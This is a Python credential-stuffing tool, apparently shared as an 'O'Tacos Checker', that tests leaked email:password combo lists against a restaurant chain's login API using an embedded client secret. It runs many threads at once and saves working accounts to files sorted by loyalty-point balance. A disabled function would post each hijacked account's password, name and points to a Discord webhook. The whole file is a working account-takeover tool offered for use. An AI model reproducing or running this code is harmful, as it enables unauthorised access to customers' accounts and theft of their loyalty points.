import requests, itertools, threading, os, time
from discord_webhook import DiscordWebhook, DiscordEmbed
from colorama import init, Fore; init()

combo = itertools.cycle(open("input/combo.txt", "r", encoding="utf-8").read().splitlines())

started = time.time()
checked = 0
hit = 0
bad = 0
error = 0

def getAuthToken(email,passw):
    headers = {
        "accept": "application/x-www-form-urlencoded",
        "host": "api.flyx.cloud",
        "user-agent": "okhttp/4.9.1"
    }
    parms = {
        "grant_type": "password",
        "username": email,
        "password": passw,
        "client_id": "app",
        "client_secret": "1QQ2CRDBOHVTSK5R6ZLFWJ7WQUCCM",
        "scope": "ordering_api app_api identity_api payment_api offline_access openid"
    }
    try:
        loginReq = requests.post("https://api.flyx.cloud/otacos/app/Connect/Token", headers=headers, data=parms)
        return loginReq.json()['access_token']
    except:
        return loginReq.text

def getLoyalityPoint(token):
    headers = {
        "accept": "application/x-www-form-urlencoded",
        "host": "api.flyx.cloud",
        "user-agent": "okhttp/4.9.1",
        "authorization": "Bearer " + token
    }

    infoGet = requests.get("https://api.flyx.cloud/otacos/app/api/User", headers=headers)
    return infoGet.json()['data']['loyaltyCard']['points']

def sendWebHook(token, passw):
    """for char in passw:
        passw = passw.replace(char, "*")

    headers = {
        "accept": "application/x-www-form-urlencoded",
        "host": "api.flyx.cloud",
        "user-agent": "okhttp/4.9.1",
        "authorization": "Bearer " + token
    }

    infoGet = requests.get("https://api.flyx.cloud/otacos/app/api/User", headers=headers).json()['data']
    webhook = DiscordWebhook(url='nope')
    embed = DiscordEmbed(title='O\'Tacos Account Checker', description='An Other Account Hitted:', color='03b2f8')
    embed.add_embed_field(name='Email', value=infoGet['email'][:5] + "*******@****.**")
    embed.add_embed_field(name='Password', value=passw)
    embed.add_embed_field(name='First Name', value=infoGet['firstName'])
    embed.add_embed_field(name='Last Name', value=infoGet['lastName'])
    embed.add_embed_field(name='Advenced Profile', value=str(infoGet['isAdvanced']))
    embed.add_embed_field(name='Points', value=str(infoGet['loyaltyCard']['points']))
    webhook.add_embed(embed)
    webhook.execute()"""

def getFileName(point):
    if point < 26:
        return "0-25.txt"
    elif point < 30:
        return "26-29.txt"
    elif point < 50:
        return "30-49.txt"
    elif point < 70:
        return "50-70.txt"
    elif point < 100:
        return "70-100.txt"
    else:
        return "100andmore.txt"
def checkAccount(email, passw):
    try:
        global checked
        global hit
        global bad
        global error
        authToken = getAuthToken(email, passw)
        if "invalid_grant Username or password is incorrect" in authToken:
            #print(Fore.RED + f"{email}:{passw} | BAD")
            bad += 1
        else:
            points = getLoyalityPoint(authToken)
            sendWebHook(authToken, passw)
            hit += 1
            with open(f"./output/{getFileName(int(points))}", "a",  encoding="utf-8") as myfile:
                myfile.write(f"{email}:{passw} | {points}pts\n")
            #print(Fore.GREEN + f"{email}:{passw} | HIT | {str(points)}pts")
        checked += 1
        with open(f"./output/all.txt", "a",  encoding="utf-8") as myfile:
                myfile.write(f"{email}:{passw}\n")
    except Exception as e:
        error += 1
        print(e)

def check():
    while True:
        email, passw = next(combo).split(":")
        checkAccount(email, passw)

baka = Fore.MAGENTA + """
░█████╗░██╗████████╗░█████╗░░█████╗░░█████╗░░██████╗  ░█████╗░██╗░░██╗███████╗░█████╗░██╗░░██╗███████╗██████╗░
██╔══██╗╚█║╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗██╔════╝  ██╔══██╗██║░░██║██╔════╝██╔══██╗██║░██╔╝██╔════╝██╔══██╗
██║░░██║░╚╝░░░██║░░░███████║██║░░╚═╝██║░░██║╚█████╗░  ██║░░╚═╝███████║█████╗░░██║░░╚═╝█████═╝░█████╗░░██████╔╝
██║░░██║░░░░░░██║░░░██╔══██║██║░░██╗██║░░██║░╚═══██╗  ██║░░██╗██╔══██║██╔══╝░░██║░░██╗██╔═██╗░██╔══╝░░██╔══██╗
╚█████╔╝░░░░░░██║░░░██║░░██║╚█████╔╝╚█████╔╝██████╔╝  ╚█████╔╝██║░░██║███████╗╚█████╔╝██║░╚██╗███████╗██║░░██║
░╚════╝░░░░░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░░╚════╝░╚═════╝░  ░╚════╝░╚═╝░░╚═╝╚══════╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
                                    By Not Sysy's#6700 - V0.0.1
                                    Checked: %checked%/%total%
                                           Hit: %hit%
                                           Bad: %bad%
                                     Check Per Minute: %cpm%
"""

total = len(open("input/combo.txt", "r", encoding="utf-8").read().splitlines())
def updateTitle():
    while True:
        checkperm = round(checked / ((time.time()-started) / 60), 2)
        os.system(f"title O'Tacos Checker - Checked: {checked} - Hit: {hit} - Bad: {bad} - Check/m: {checkperm} - Error: {error}")
        os.system("clear")
        print(baka.replace("%checked%",str(checked)).replace("%total%",str(total)).replace("%hit%",str(hit)).replace("%bad%",str(bad)).replace("%cpm%",str(checkperm)))
        time.sleep(0.2)
        if checked >= len(open("input/combo.txt", "r", encoding="utf-8").read().splitlines()):
            os._exit(1)

def main():
    os.system("cls")
    print(Fore.MAGENTA + """
░█████╗░██╗████████╗░█████╗░░█████╗░░█████╗░░██████╗  ░█████╗░██╗░░██╗███████╗░█████╗░██╗░░██╗███████╗██████╗░
██╔══██╗╚█║╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗██╔════╝  ██╔══██╗██║░░██║██╔════╝██╔══██╗██║░██╔╝██╔════╝██╔══██╗
██║░░██║░╚╝░░░██║░░░███████║██║░░╚═╝██║░░██║╚█████╗░  ██║░░╚═╝███████║█████╗░░██║░░╚═╝█████═╝░█████╗░░██████╔╝
██║░░██║░░░░░░██║░░░██╔══██║██║░░██╗██║░░██║░╚═══██╗  ██║░░██╗██╔══██║██╔══╝░░██║░░██╗██╔═██╗░██╔══╝░░██╔══██╗
╚█████╔╝░░░░░░██║░░░██║░░██║╚█████╔╝╚█████╔╝██████╔╝  ╚█████╔╝██║░░██║███████╗╚█████╔╝██║░╚██╗███████╗██║░░██║
░╚════╝░░░░░░░╚═╝░░░╚═╝░░╚═╝░╚════╝░░╚════╝░╚═════╝░  ░╚════╝░╚═╝░░╚═╝╚══════╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝

By Not Sysy's#6700 - V0.0.1
    """)
    threading.Thread(target=updateTitle).start()
    for _ in range(int(input('Thread> '))):
        threading.Thread(target=check).start()

main()
